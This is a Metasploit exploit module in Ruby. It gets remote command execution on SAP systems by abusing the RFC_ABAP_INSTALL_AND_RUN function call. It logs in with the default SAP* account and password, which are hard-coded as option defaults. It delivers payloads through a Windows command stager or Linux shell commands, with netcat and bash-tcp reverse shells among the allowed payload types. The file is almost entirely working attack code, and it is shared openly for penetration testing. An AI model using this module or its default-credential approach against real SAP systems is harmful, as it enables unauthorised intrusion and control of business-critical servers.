##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their contributions -
# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and
# Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis
# who have Beta tested the modules and provided excellent feedback. Some people
# just seem to enjoy hacking SAP :)
##

require 'msf/core'
require 'msf/core/exploit/sap'

class Metasploit4 < Msf::Exploit::Remote

  Rank = GreatRanking

  include Msf::Exploit::CmdStagerVBS
  include Msf::Exploit::EXE
  include Msf::Exploit::SAP::RFC

  def initialize
    super(
      'Name'           => 'SAP RFC RFC_ABAP_INSTALL_AND_RUN Remote Command Execution',
      'Description'    => %q{
        This module makes use of the RFC_ABAP_INSTALL_AND_RUN Remote Function Call to execute arbitrary SYSTEM commands.
        RFC_ABAP_INSTALL_AND_RUN takes ABAP source lines and executes them.
        It is common for the the function to be disabled or access revoked in a production system. It is also deprecated.
        The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc).
      },
      'References'     => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
      'Platform'       => ['win', 'unix'],
      'Payload' => {
          'DisableNops' => true
      },
      'Targets' => [
        [ 'Linux',
          {
            'Arch'     => ARCH_CMD,
            'Platform' => 'unix',
            'Payload' => {
              'Space' => 200,
              'Compat' => {
                'PayloadType' => 'cmd cmd_bash',
                'RequiredCmd' => 'generic telnet netcat perl bash-tcp'
              },
            },
          }
        ],
        [ 'Windows x64',
          {
            'Arch' => ARCH_X86_64,
            'Platform' => 'win'
          }
        ]
      ],
      'DefaultTarget' => 0,
      'Privileged' => false,
      'Author' => [ 'nmonkee' ],
      'License' => MSF_LICENSE,
      'DisclosureDate' => 'Apr 25 2012'
    )

    register_options(
      [
        Opt::RHOST,
        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
        OptString.new('PASSWORD', [true, 'Password', '06071992']),
      ], self.class)

    register_advanced_options(
      [
        OptInt.new('PAYLOAD_SPLIT', [true, 'Size of payload segments', '230']),
      ], self.class)
  end

  def exploit
    if target.name =~ /Windows/
      linemax = datastore['PAYLOAD_SPLIT']
      vprint_status("[SAP] #{datastore['rhost']}:#{datastore['rport']} - Using custom payload size of #{linemax}") if linemax != 230
      print_status("[SAP] #{datastore['rhost']}:#{datastore['rport']} - Sending RFC request")
      execute_cmdstager({ :delay => 0.35, :linemax => linemax })
    elsif target.name =~ /Linux/
      print_status("[SAP] #{datastore['rhost']}:#{datastore['rport']} - Executing payload...")
      send_payload("#{payload.encoded} &")
    end
  end

  def execute_command(cmd, opts)
    send_payload(cmd)
  end

  def send_payload(cmd)
    begin
      login(rhost, rport, datastore['CLIENT'], datastore['USERNAME'], datastore['PASSWORD']) do |conn|
        vprint_line rfc_abap_install_and_run_cmd(conn, cmd)
      end
    rescue NWError
    end
  end

end

